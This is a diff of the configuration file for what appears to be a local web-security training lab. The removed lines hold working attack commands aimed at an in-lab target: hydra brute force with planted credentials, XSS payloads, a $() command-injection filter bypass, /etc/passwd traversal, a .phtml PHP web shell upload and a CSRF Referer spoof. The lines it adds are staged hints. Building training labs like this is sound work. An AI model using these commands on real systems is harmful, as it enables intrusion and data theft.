@@ -27,35 +27,37 @@ export function targetPathFor(moduleId) {
 
 export function targetUrlFor(moduleId, mode = 'tutorial') {
   // Same-origin proxy via the frontend nginx.
-  //   tutorial → /target/...     (easy backend; admin:password123 works)
-  //   lab      → /target-op/...  (HARDER backend; different cred set, no
-  //                               username enumeration, slower attempts).
-  // Both prefixes serve the same Jinja templates so the UI is identical.
-  const prefix = mode === 'lab' ? '/target-op' : '/target'
+  //   tutorial → /target/...      (easy backend; admin:password123 works)
+  //   lab      → /target-zap/...  (HARDER backend, reached THROUGH OWASP ZAP so
+  //                                every browser request lands in ZAP history —
+  //                                like Burp Proxy History. Forwards to
+  //                                target-agent/op/... which is the same harder
+  //                                backend the old /target-op route served.)
+  // Both serve the same Jinja templates so the UI is identical.
+  const prefix = mode === 'lab' ? '/target-zap' : '/target'
   return `${prefix}${targetPathFor(moduleId)}`
 }
 
 // Required tools displayed in Lab Mode. Local-only — these reference
 // the local ATTENSE AttackBox / OWASP ZAP container, never external targets.
 export const LAB_REQUIRED_TOOLS = {
-  recon:         ['Terminal', 'Nmap', 'Gobuster/ffuf', 'ZAP'],
-  brute_force:   ['Terminal', 'ZAP', 'Hydra', 'Wordlists'],
-  xss:           ['ZAP', 'Repeater', 'curl'],
-  cmd_injection: ['Terminal', 'ZAP', 'curl'],
-  dir_traversal: ['Terminal', 'ZAP', 'curl'],
-  file_upload:   ['Terminal', 'ZAP', 'curl'],
-  csrf:          ['ZAP', 'Request Inspector', 'Repeater'],
+  recon:         ['Browser', 'ZAP Proxy History', 'ZAP Inspector', 'ZAP Repeater', 'AttackBox (optional ffuf/curl)'],
+  brute_force:   ['ZAP Repeater', 'ZAP Fuzzer', 'AttackBox local wordlist'],
+  xss:           ['Browser', 'ZAP Proxy History', 'ZAP Inspector', 'ZAP Repeater', 'ZAP Fuzzer'],
+  cmd_injection: ['Browser', 'ZAP Proxy History', 'ZAP Repeater', 'ZAP Fuzzer', 'AttackBox baseline only'],
+  dir_traversal: ['Browser', 'ZAP Proxy History', 'ZAP Inspector', 'ZAP Repeater', 'ZAP Fuzzer'],
+  file_upload:   ['Browser', 'ZAP Proxy History', 'ZAP Inspector', 'ZAP Repeater', 'ZAP Fuzzer'],
+  csrf:          ['Browser', 'ZAP Proxy History', 'ZAP Inspector', 'ZAP Repeater'],
 }
-// Deprecated alias
-export const REQUIRED_TOOLS_BY_MODULE = LAB_REQUIRED_TOOLS
 
 // Lab-mode TASKS — TryHackMe-style rich lab manual.
 //
 // Each entry is a structured task with:
 //   - n          : step number
 //   - title      : short label
+//   - tool       : expected tool (Browser, ZAP Repeater, AttackBox, etc.)
 //   - goal       : 1-sentence purpose
-//   - command    : single literal command to copy/paste (or commands: [...])
+//   - command    : AttackBox-only literal command to copy/paste (or commands: [...])
 //   - expected   : sample of the expected output that proves success
 //   - flags      : optional bullet list of important flag explanations
 //   - hint       : optional gotcha
@@ -63,330 +65,8 @@ export const REQUIRED_TOOLS_BY_MODULE = LAB_REQUIRED_TOOLS
 //
 // The Workspace renders these as code-block cards, with copy buttons, expected
 // output snippets, and a green ✓ next to tasks whose success_marker has fired.
-export const LAB_STEPS_BY_MODULE = {
-  // Lab-mode task ladder.
-  recon: [
-    {
-      n: 1,
-      title: 'Probe the target home page',
-      goal: 'Confirm the target is reachable and capture server banner.',
-      command: 'curl -i http://target-agent/op/',
-      expected: 'HTTP/1.1 200 OK\nServer: Werkzeug/x.y.z Python/3.x\n<title>AcmeCorp Internal Portal</title>',
-      success_marker: 'portal_visited',
-    },
-    {
-      n: 2,
-      title: 'Enumerate hidden routes with a wordlist',
-      goal: 'Discover paths under /op that are not advertised. The harder backend hides robots.txt; the real clue is somewhere else.',
-      command: 'gobuster dir -u http://target-agent/op -w /usr/share/wordlists/dirb/common.txt -t 20 -q',
-      flags: [
-        '-u → target URL prefix (/op)',
-        '-w → wordlist (dirb/common.txt is preinstalled in AttackBox)',
-        '-t 20 → 20 parallel threads',
-        '-q → quiet (only show found paths)',
-      ],
-      expected: '/auth/login (Status: 200)\n/files/read (Status: 200)\n/profile (Status: 302)\n/system/ping (Status: 200)\n/.git/config (Status: 200)',
-      hint: 'If gobuster prints "wordlist file does not exist", try /wordlists/common.txt. Watch for /.git/config — that is the Lab-mode hidden clue.',
-    },
-    {
-      n: 3,
-      title: 'Inspect the leaked .git/config',
-      goal: 'Lab-mode robots.txt is a 404. The clue lives at /.git/config — read it for repo metadata.',
-      command: 'curl -s http://target-agent/op/.git/config',
-      expected: '[remote "origin"]\n    url = git@gitlab.acme.local:internal/staff-portal.git',
-      success_marker: 'hidden_clue_accessed',
-    },
-    {
-      n: 4,
-      title: 'Visit each application area to map the surface',
-      goal: 'Touch every endpoint the wordlist found so the recon-sequence detection fires.',
-      commands: [
-        'curl -s http://target-agent/op/search?q=test    >/dev/null',
-        'curl -s http://target-agent/op/system/ping?host=127.0.0.1 >/dev/null',
-        'curl -s http://target-agent/op/files/read?path=readme.txt >/dev/null',
-        'curl -s http://target-agent/op/profile/         >/dev/null',
-      ],
-      expected: '(no output — but the target-agent records each visit as evidence)',
-      success_marker: 'recon_sequence_observed',
-    },
-    {
-      n: 5,
-      title: 'Run Check Progress',
-      goal: 'Confirm portal_visited and recon_sequence_observed events fired with via=attackbox.',
-    },
-  ],
-
-  brute_force: [
-    {
-      n: 1,
-      title: 'Confirm the login endpoint responds',
-      goal: 'Verify /auth/login is up and inspect the form structure.',
-      command: 'curl -i http://target-agent/op/auth/login',
-      expected: 'HTTP/1.1 200 OK\n<form method="POST" action="/auth/login">\n  <input name="username" ...\n  <input name="password" ...',
-    },
-    {
-      n: 2,
-      title: 'Confirm error response is generic',
-      goal: 'The harder backend returns "Invalid credentials" for everything — no username enumeration here. You will need to brute force usernames AND passwords together.',
-      commands: [
-        "curl -s -X POST http://target-agent/op/auth/login -d 'username=admin&password=wrong' | grep -oE 'Invalid credentials'",
-        "curl -s -X POST http://target-agent/op/auth/login -d 'username=ghost&password=wrong' | grep -oE 'Invalid credentials'",
-      ],
-      expected: 'Invalid credentials\nInvalid credentials',
-      hint: 'Same error for known and unknown users — no leak. Stick to a small candidate list.',
-    },
-    {
-      n: 3,
-      title: 'Build a small wordlist of likely usernames',
-      goal: 'Stage 3 candidate accounts to test (admin, operator, service — the realistic ones for an internal portal).',
-      command: "printf 'admin\\noperator\\nservice\\n' > /lab/users.txt && cat /lab/users.txt",
-      expected: 'admin\noperator\nservice',
-    },
-    {
-      n: 4,
-      title: 'Run hydra with a stronger password list',
-      goal: 'rockyou-mini is too weak for the harder backend. Use the larger list and a custom policy-aware list.',
-      command: "hydra -L /lab/users.txt -P /wordlists/rockyou-mini.txt target-agent http-post-form '/op/auth/login:username=^USER^&password=^PASS^:Invalid credentials' -t 4 -f",
-      flags: [
-        '-L users.txt → username list',
-        '-P rockyou-mini.txt → may not contain the Lab-mode password (this is the point — the harder backend uses non-default creds)',
-        "http-post-form 'PATH:BODY:FAIL_STRING' → fail string is now \"Invalid credentials\"",
-        '-t 4 → reduce threads (the backend has a 600ms artificial delay per attempt)',
-        '-f → stop on first valid credential',
-      ],
-      expected: '(if rockyou-mini does not contain the password, hydra will exhaust the list. Try the policy-hint creds in step 5.)',
-      success_marker: 'brute_force_pattern (≥3 fails)',
-      hint: 'The login banner says "assigned credentials". Try names like Br3akMe!2025 / Tr0ub4dor&3 / S3rvice@cct that match a typical password-policy template.',
-    },
-    {
-      n: 5,
-      title: 'Verify the credential by hand',
-      goal: 'Confirm a credential works against the harder backend.',
-      command: "curl -i -X POST http://target-agent/op/auth/login -d 'username=admin&password=Br3akMe%212025'",
-      expected: 'HTTP/1.1 302 FOUND\nLocation: /profile/',
-      hint: 'A 302 to /profile/ means login succeeded. 401 means the password is wrong. Note the URL-encoded ! is %21.',
-    },
-    {
-      n: 6,
-      title: 'Run Check Progress',
-      goal: 'Confirm the brute-force pattern + credential-found events fired with via=attackbox.',
-    },
-  ],
-
-  xss: [
-    {
-      n: 1,
-      title: 'Inspect the search endpoint',
-      goal: 'Confirm /search reflects the q parameter into the response.',
-      command: "curl -s 'http://target-agent/op/search?q=hello' | grep -A1 'Search Results'",
-      expected: 'Search Results\nhello',
-    },
-    {
-      n: 2,
-      title: 'Send a script-tag payload',
-      goal: 'Test if the response renders unescaped HTML.',
-      command: "curl -s --data-urlencode 'q=<script>alert(1)</script>' -G http://target-agent/op/search | grep -oE '<script[^<]*</script>'",
-      expected: '<script>alert(1)</script>',
-      hint: 'If you see the literal <script> tag in the output, reflection is unescaped.',
-    },
-    {
-      n: 3,
-      title: 'Try alternative XSS contexts',
-      goal: 'Image-onerror and SVG-onload payloads dodge naive script-tag filters.',
-      commands: [
-        'curl -s -G --data-urlencode \'q=<img src=x onerror=alert(1)>\' http://target-agent/op/search | grep -oE "<img[^>]*>"',
-        'curl -s -G --data-urlencode \'q=<svg onload=alert(1)>\' http://target-agent/op/search | grep -oE "<svg[^>]*>"',
-      ],
-      expected: '<img src=x onerror=alert(1)>\n<svg onload=alert(1)>',
-      success_marker: 'xss_payload_observed (≥2 distinct payloads)',
-    },
-    {
-      n: 4,
-      title: 'Confirm reflection is verbatim',
-      goal: 'Diff the input and the reflected output. They should be byte-identical.',
-      command: "diff <(echo '<script>alert(1)</script>') <(curl -s --data-urlencode 'q=<script>alert(1)</script>' -G http://target-agent/op/search | grep -oE '<script[^<]*</script>')",
-      expected: '(no output — diff returns 0, meaning the strings match)',
-      success_marker: 'reflected_input_detected',
-    },
-    {
-      n: 5,
-      title: 'Run Check Progress',
-      goal: 'Confirm xss_payload_observed and reflected_input_detected fired via=attackbox.',
-    },
-  ],
-
-  cmd_injection: [
-    {
-      n: 1,
-      title: 'Probe the ping endpoint',
-      goal: 'Confirm /system/ping accepts a host parameter and returns ping output.',
-      command: "curl -s 'http://target-agent/op/system/ping?host=127.0.0.1' | grep -A2 'PING'",
-      expected: 'PING 127.0.0.1 (127.0.0.1) ...\n64 bytes from 127.0.0.1 ...',
-    },
-    {
-      n: 2,
-      title: 'Try the obvious separators (they will be filtered)',
-      goal: 'The harder backend strips ; and | before running the command. Confirm those bypasses are dead.',
-      commands: [
-        "curl -s -G --data-urlencode 'host=127.0.0.1; id' http://target-agent/op/system/ping | tail -3",
-        "curl -s -G --data-urlencode 'host=127.0.0.1 | hostname' http://target-agent/op/system/ping | tail -3",
-      ],
-      expected: '(no uid= line — semicolons and pipes are stripped before popen)',
-      success_marker: 'command_separator_observed (you still get credit for trying)',
-    },
-    {
-      n: 3,
-      title: 'Bypass with $() command substitution',
-      goal: 'The filter misses $() and backticks. Concat the host with $(cmd) so server-side popen substitutes — and ping echoes the bad host into its error message.',
-      commands: [
-        "curl -s -G --data-urlencode 'host=127.0.0.1$(head -1 /etc/passwd)' http://target-agent/op/system/ping | grep -oE 'root:[^ ]+'",
-        "curl -s -G --data-urlencode 'host=127.0.0.1$(uname -a)' http://target-agent/op/system/ping | tail -3",
-      ],
-      expected: 'root:x:0:0:root:/root:/bin/bash',
-      success_marker: 'command_injection_detected',
-      hint: 'Use SINGLE quotes around --data-urlencode so bash does not eat $(...) before sending. The server runs ping with your concatenated host, and the error \"Name or service not known\" leaks the substituted output back to you.',
-    },
-    {
-      n: 4,
-      title: 'Confirm with another sensitive file',
-      goal: 'Re-use the bypass to disclose a second file.',
-      command: "curl -s -G --data-urlencode 'host=127.0.0.1$(cat /etc/hostname)' http://target-agent/op/system/ping | grep -oE 'ping:[^<]*'",
-      expected: 'ping: 127.0.0.1<the container hostname>: Name or service not known',
-    },
-    {
-      n: 5,
-      title: 'Run Check Progress',
-      goal: 'Confirm command_injection_detected fired with via=attackbox.',
-    },
-  ],
-
-  dir_traversal: [
-    {
-      n: 1,
-      title: 'Probe the file viewer',
-      goal: 'Confirm /files/read returns the requested file content.',
-      command: "curl -s 'http://target-agent/op/files/read?path=readme.txt'",
-      expected: 'ATTENSE Lab Target - static readme',
-    },
-    {
-      n: 2,
-      title: 'Try basic ../ traversal (it will be rejected)',
-      goal: 'The harder backend rejects any path containing literal ".." with a 200 OK plus error body. You still get credit for trying.',
-      command: "curl -s 'http://target-agent/op/files/read?path=../../etc/passwd'",
-      expected: "[ERROR] Path contains forbidden sequence '..'",
-      success_marker: 'traversal_pattern_observed (credited even when rejected)',
-    },
-    {
-      n: 3,
-      title: 'Bypass with an absolute path',
-      goal: 'The .. filter is naive — absolute paths starting with / are not normalized. Pass /etc/passwd directly.',
-      command: "curl -s 'http://target-agent/op/files/read?path=/etc/passwd' | grep -E '^root:'",
-      expected: 'root:x:0:0:root:/root:/bin/bash',
-      success_marker: 'sensitive_file_disclosed',
-    },
-    {
-      n: 4,
-      title: 'Disclose another sensitive file',
-      goal: 'Try a second absolute path to confirm the bypass is general.',
-      commands: [
-        "curl -s 'http://target-agent/op/files/read?path=/etc/hostname'      | head -1",
-        "curl -s 'http://target-agent/op/files/read?path=/etc/passwd'        | head -1",
-        "curl -s 'http://target-agent/op/files/read?path=/proc/self/environ' | tr '\\0' '\\n' | head -5",
-      ],
-      expected: '(only the depth that resolves to /etc/passwd will return root:x:0:0:...)',
-    },
-    {
-      n: 5,
-      title: 'Run Check Progress',
-      goal: 'Confirm sensitive_file_disclosed fired with via=attackbox.',
-    },
-  ],
-
-  file_upload: [
-    {
-      n: 1,
-      title: 'Inspect the upload endpoint',
-      goal: 'Confirm /files/upload accepts multipart POSTs.',
-      command: 'curl -s http://target-agent/op/files/upload | grep -i upload',
-      expected: '<input type="file" ... <button> Upload File',
-    },
-    {
-      n: 2,
-      title: 'Upload a benign text file',
-      goal: 'Establish baseline behaviour with a safe upload.',
-      command: "echo 'hello' > /tmp/probe.txt && curl -s -F 'file=@/tmp/probe.txt' http://target-agent/op/files/upload | grep -oE '/static/uploads/[^\"]+'",
-      expected: '/static/uploads/probe.txt',
-      success_marker: 'file_upload_used + file_saved',
-    },
-    {
-      n: 3,
-      title: 'Try .php (it will be blocked)',
-      goal: 'The harder backend rejects .php and other obvious server-execution extensions with HTTP 400.',
-      command: "echo '<?php echo shell_exec($_GET[\"c\"]); ?>' > /tmp/shell.php && curl -s -o /dev/null -w 'HTTP %{http_code}\\n' -F 'file=@/tmp/shell.php' http://target-agent/op/files/upload",
-      expected: 'HTTP 400',
-      hint: 'A naive .php block list misses sibling extensions. Try .phtml, .svg, or .html.',
-    },
-    {
-      n: 4,
-      title: 'Bypass the block list with .phtml',
-      goal: 'The block list misses .phtml — many web servers still execute it as PHP.',
-      command: "echo '<?php echo shell_exec($_GET[\"c\"]); ?>' > /tmp/shell.phtml && curl -s -F 'file=@/tmp/shell.phtml' http://target-agent/op/files/upload | grep -oE '/static/uploads/[^\"]+'",
-      expected: '/static/uploads/shell.phtml',
-      success_marker: 'dangerous_extension_accepted + unrestricted_upload_detected',
-    },
-    {
-      n: 5,
-      title: 'Run Check Progress',
-      goal: 'Confirm unrestricted_upload_detected fired with via=attackbox.',
-    },
-  ],
-
-  csrf: [
-    {
-      n: 1,
-      title: 'Authenticate and capture the session cookie',
-      goal: 'You need a valid session before CSRF makes sense.',
-      command: "curl -c /tmp/cookies.txt -s -X POST http://target-agent/op/auth/login -d 'username=admin&password=Br3akMe%212025' -o /dev/null -w 'HTTP %{http_code}\\n'",
-      expected: 'HTTP 302',
-    },
-    {
-      n: 2,
-      title: 'Inspect the profile-update form',
-      goal: 'Look for any anti-CSRF token. There should not be one.',
-      command: "curl -b /tmp/cookies.txt -s http://target-agent/op/profile/ | grep -E 'csrf|token|hidden' || echo 'NO CSRF TOKEN FOUND'",
-      expected: 'NO CSRF TOKEN FOUND',
-      hint: 'A real app would have <input type="hidden" name="_csrf_token" value="..."> in this form.',
-    },
-    {
-      n: 3,
-      title: 'Try a naive forged POST (it will be rejected)',
-      goal: 'The harder backend requires a token OR a same-origin Referer. Without either, it returns 403.',
-      command: "curl -b /tmp/cookies.txt -s -o /dev/null -w 'HTTP %{http_code}\\n' -X POST http://target-agent/op/profile/update -d 'email=pwned@evil.lab'",
-      expected: 'HTTP 403',
-      hint: 'The check is loose — it only looks for /profile/ in the Referer string. Spoof it.',
-    },
-    {
-      n: 4,
-      title: 'Bypass with a forged Referer',
-      goal: "Add -H 'Referer: http://target-agent/profile/' so the backend's loose check passes.",
-      command: "curl -b /tmp/cookies.txt -s -o /dev/null -w 'HTTP %{http_code}\\n' -X POST -H 'Referer: http://target-agent/profile/' http://target-agent/op/profile/update -d 'email=pwned@evil.lab'",
-      expected: 'HTTP 200',
-      success_marker: 'csrf_token_missing + profile_changed_without_csrf',
-    },
-    {
-      n: 5,
-      title: 'Confirm the change took effect',
-      goal: 'Re-read /profile/ to verify the email mutation persisted.',
-      command: "curl -b /tmp/cookies.txt -s http://target-agent/op/profile/ | grep -oE 'pwned@evil[^<]*'",
-      expected: 'pwned@evil.lab',
-    },
-    {
-      n: 6,
-      title: 'Run Check Progress',
-      goal: 'Confirm profile_changed_without_csrf fired with via=attackbox.',
-    },
-  ],
-}
+// Lab mode is now objective-based. Completion is determined by backend evidence
+// and report quality signals, not by a rigid frontend step checklist.
 export const MISSION_BRIEFINGS = {
   recon: {
     background:
@@ -415,6 +95,15 @@ export const MISSION_BRIEFINGS = {
       'In real-world pentests, recon determines your entire attack strategy. Missing an endpoint '
       + 'means missing a vulnerability. Tools like Nmap, Nikto, and Burp Suite automate this at scale.',
     tip: 'Check the HTML source code of each page — developers often leave sensitive information in comments.',
+    // Operator-mode staged hints — ZAP/AttackBox-driven, evidence-based, and
+    // kept SEPARATE from the guided tip so guided discovery help never leaks into
+    // Operator. Never names the exact hidden route.
+    operatorHints: [
+      'Hint 1 - Methodology: Treat recon as local application mapping: browse normally first, then replay candidate paths through ZAP so every observation has request/response evidence.',
+      'Hint 2 - Where to inspect: Use Proxy History and Inspector to compare 200, 302, and 404 responses under /op/. Hardened discovery files can be useful even when they return 404.',
+      'Hint 3 - What to compare: Look at status code, content type, response length, and body text before deciding that a route is real.',
+      'Hint 4 - Tool: Use Repeater for individual paths and AttackBox only for validator-safe local ffuf/curl commands against target-agent.',
+    ],
   },
 
   brute_force: {
@@ -444,7 +133,22 @@ export const MISSION_BRIEFINGS = {
       'Tools like Hydra, Burp Intruder, and Medusa automate this at scale. '
       + 'Without rate limiting, an attacker can test thousands of credentials per minute. '
       + 'Defenses: rate limiting, CAPTCHA, MFA, account lockout, bcrypt/scrypt password hashing.',
+    // Guided-mode hint (beginner PortSwigger lab): the enumeration + planted
+    // credential help is intentional here and appears only in Guided Mode.
     tip: 'admin:password123 is planted in the lab — pay attention to the error messages to confirm the username first.',
+    // Operator-mode staged hints (harder lab): ZAP-Workspace-driven, generic
+    // errors, evidence-based. NEVER reveals the credential — the answer lives
+    // only in the local /lab/operator-passwords.txt seed. Kept SEPARATE from the
+    // guided hints above so guided enumeration help never leaks into Operator.
+    operatorHints: [
+      'Hint 1 - Methodology: Capture one failed login first, then use response differences to guide testing instead of guessing in the browser.',
+      'Hint 2 - Where to inspect: In Proxy History, send POST /op/auth/login to Repeater and verify the body fields and generic 401 response.',
+      "Hint 3 - Do NOT use the Fuzzer's built-in Common passwords / Common usernames / Leaked mini-list presets here — none of them contain the real value for this lab instance and every row will just come back 401.",
+      "Hint 4 - Get the real payloads: open the AttackBox terminal and run  cat /lab/operator-passwords.txt  — then copy those lines into the Fuzzer's payload box, replacing whatever preset is loaded.",
+      'Hint 5 - The operator backend only accepts a small, fixed set of usernames: admin, operator, service. It gives an identical generic "Invalid credentials" 401 for every wrong guess, so you cannot tell which part (username or password) was wrong from the response alone.',
+      'Hint 6 - Sniper only marks one field at a time, so run the Fuzzer once PER username: username=admin&password=§, then username=operator&password=§, then username=service&password=§ — each time with the real wordlist from Hint 4 as payloads. The row that returns 302 instead of 401 (and a different length) is the hit.',
+      'Hint 7 - Tool: ZAP Fuzzer (GUI) and Hydra (AttackBox CLI) are two ways to do the SAME thing — pick one, not both. Hydra also needs the real wordlist from Hint 4, not a built-in list.',
+    ],
   },
 
   xss: {
@@ -476,6 +180,14 @@ export const MISSION_BRIEFINGS = {
       + 'perform actions on behalf of users, and exfiltrate data. '
       + 'Defenses: HTML entity encoding, CSP headers, HttpOnly cookies.',
     tip: 'After submitting a payload, inspect the page source to see exactly how your input was rendered.',
+    // Operator-mode staged hints — ZAP-Workspace-driven, evidence-based. Kept
+    // separate from the guided tip; never hands over a working payload.
+    operatorHints: [
+      'Hint 1 - Methodology: Start with a harmless marker, then change only the reflected q parameter after you know where it appears.',
+      'Hint 2 - Where to inspect: Use Proxy History, Inspector, and Repeater on GET /op/search?q=... to locate the reflection context in the response body.',
+      'Hint 3 - What to compare: Compare whether the marker or proof payload returns encoded, stripped, or preserved as HTML in the response.',
+      'Hint 4 - Tool: Put XSS proof payloads in ZAP Repeater/Fuzzer, not AttackBox, because they are HTTP parameter values rather than shell commands.',
+    ],
   },
 
   cmd_injection: {
@@ -508,6 +220,14 @@ export const MISSION_BRIEFINGS = {
       + 'This is how major breaches start. Never pass user input to system commands.',
     tip: 'The ; and && separators are the most reliable. Try reading /etc/passwd first — '
       + 'if you see "root:x:0:0:", injection is confirmed.',
+    // Operator-mode staged hints — Repeater/Fuzzer-driven, harmless local proofs
+    // only. Kept separate from the guided tip so it never hands over the answer.
+    operatorHints: [
+      'Hint 1 - Methodology: Establish a clean diagnostics baseline before testing any command-injection proof.',
+      'Hint 2 - Where to inspect: Send GET /op/system/ping?host=... to Repeater and modify only the host parameter.',
+      'Hint 3 - What to compare: Look for extra local proof output, status changes, or body-length changes after the normal diagnostics output.',
+      'Hint 4 - Tool: Use ZAP Repeater/Fuzzer for separator and substitution payloads; AttackBox is only for clean baseline requests.',
+    ],
   },
 
   dir_traversal: {
@@ -540,6 +260,14 @@ export const MISSION_BRIEFINGS = {
       + 'Always validate and canonicalize file paths on the server side.',
     tip: '../../etc/passwd is the canonical test path. Each ../ moves one directory up. '
       + 'The base directory is /app/static/, so you need enough ../ to reach /etc/.',
+    // Operator-mode staged hints — Repeater/Fuzzer-driven, evidence-based. Kept
+    // separate from the guided tip; never names the exact traversal target.
+    operatorHints: [
+      'Hint 1 - Methodology: Confirm a normal allowed file first, then modify only the file/path parameter.',
+      'Hint 2 - Where to inspect: Use Proxy History and Repeater on GET /op/files/read?... and keep the baseline response visible for comparison.',
+      'Hint 3 - What to compare: Compare status, length, and body text between an allowed file, a rejected pattern, and a local lab disclosure candidate.',
+      'Hint 4 - Tool: Use Repeater or Fuzzer for path variants; do not rely on AttackBox pipelines or output filters.',
+    ],
   },
 
   file_upload: {
@@ -572,6 +300,14 @@ export const MISSION_BRIEFINGS = {
       + 'Defenses: extension allowlists, content-type validation, '
       + 'storing files outside the web root, renaming uploads, and scanning with antivirus.',
     tip: 'Try uploading a .html file with <script>alert(1)</script> — it demonstrates stored XSS via file upload.',
+    // Operator-mode staged hints — Repeater/Fuzzer-driven, harmless proof files
+    // only. Kept separate from the guided tip; never asks for a real web shell.
+    operatorHints: [
+      'Hint 1 - Methodology: Upload a normal harmless file first so you understand the accepted multipart shape.',
+      'Hint 2 - Where to inspect: In Inspector, focus on the multipart filename, file-part Content-Type, and response link.',
+      'Hint 3 - What to compare: Change one validation field at a time and compare whether the server rejects, stores, or serves the proof file.',
+      'Hint 4 - Tool: Use ZAP Repeater/Fuzzer for multipart edits and keep proof file bodies harmless; do not create a web shell.',
+    ],
   },
 
   csrf: {
@@ -602,6 +338,14 @@ export const MISSION_BRIEFINGS = {
       + 'Modern frameworks (Django, Rails, Spring) include CSRF protection by default, but '
       + 'custom APIs and SPAs often forget it. Always use anti-CSRF tokens for state-changing operations.',
     tip: 'Log in as guest:guest first — the CSRF attack only works when you have an active session.',
+    // Operator-mode staged hints — Repeater/Inspector-driven, local lure only.
+    // Kept separate from the guided tip; never points at an external exploit host.
+    operatorHints: [
+      'Hint 1 - Methodology: Identify the normal state-changing profile update before using the local lure.',
+      'Hint 2 - Where to inspect: Use Proxy History and Inspector on POST /op/profile/update to check for token fields and session-only trust.',
+      'Hint 3 - What to compare: Compare the profile state before and after the local lure submission, and confirm no CSRF token protected the change.',
+      'Hint 4 - Tool: Use Browser, Inspector, and Repeater inside the local lab only; do not use external exploit servers or terminal curl chains.',
+    ],
   },
 }
 
@@ -1346,19 +1090,9 @@ export function tutorialStepsFor(moduleId) {
   return b.tutorial_steps || b.steps || []
 }
 
-/** Lab mode: return the rich structured task objects for the AttackBox. */
-export function labStepsFor(moduleId) {
-  return LAB_STEPS_BY_MODULE[moduleId] || [
-    'Open the Terminal and probe the local target with curl/nmap.',
-    'Capture relevant requests in ZAP and study the parameters.',
-    'Iterate on payloads using ZAP Repeater or curl from the Terminal.',
-    'Confirm the vulnerability indicator in the response.',
-    'Run Check Progress to validate the detection.',
-  ]
-}
-
+/** Lab mode: return the rich structured Operator Mode task objects. */
 export function requiredToolsFor(moduleId) {
-  return LAB_REQUIRED_TOOLS[moduleId] || ['Terminal', 'ZAP']
+  return LAB_REQUIRED_TOOLS[moduleId] || ['Browser', 'ZAP Repeater', 'ZAP Fuzzer', 'AttackBox (safe commands only)']
 }
 
 /** Return the objective text for lab mode. */
@@ -1367,6 +1101,6 @@ export function labObjectiveFor(moduleId) {
   if (b.lab_objective) return b.lab_objective
   const base = b.objective || b.background || ''
   return base
-    ? `Lab brief — ${base} Use the local Terminal and ZAP to drive the attack against the in-lab target only.`
-    : 'Use the local Terminal and ZAP to investigate the in-lab target and confirm the vulnerability.'
+    ? `Lab brief — ${base} Use the local Browser, ZAP tools, and validator-safe AttackBox commands only where the brief labels them.`
+    : 'Use the local Browser, ZAP tools, and validator-safe AttackBox commands only where the brief labels them.'
 }
